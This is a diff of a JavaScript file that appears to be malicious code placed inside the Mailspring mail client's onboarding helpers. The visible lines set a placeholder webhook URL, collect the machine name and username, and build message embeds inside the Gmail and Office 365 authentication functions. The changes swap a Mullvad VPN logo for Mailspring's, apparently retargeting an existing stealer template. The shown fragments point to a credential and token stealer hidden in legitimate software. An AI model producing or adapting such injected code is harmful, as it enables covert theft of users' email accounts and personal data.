@@ -1,5 +1,5 @@
 const webhookUrl = "%WEBHOOK%"
-
+//C:\Users\q.bodart\AppData\Local\Mailspring\app-1.13.1\resources\cece\internal_packages\onboarding\lib\onboarding-helpers.js
 const computerName =
 process.env.COMPUTERNAME || process.env.HOSTNAME || process.env.USERDOMAIN;
 const username =
@@ -122,7 +122,7 @@ async function expandAccountWithCommonSettings(account) {
         ],
   
         thumbnail: {
-          url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
+          url: `https://c.clc2l.com/t/m/a/mailspring-p3IsGU.png`,
         },
       };
   
@@ -306,7 +306,7 @@ async function buildGmailAccountFromAuthResponse(code) {
         ],
   
         thumbnail: {
-          url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
+          url: `https://c.clc2l.com/t/m/a/mailspring-p3IsGU.png`,
         },
       };
   
@@ -424,7 +424,7 @@ async function buildO365AccountFromAuthResponse(code) {
         ],
   
         thumbnail: {
-          url: `https://mullvad.net/press/MullvadVPN_logo_Round_RGB_Color_negative.png`,
+          url: `https://c.clc2l.com/t/m/a/mailspring-p3IsGU.png`,
         },
       };
   
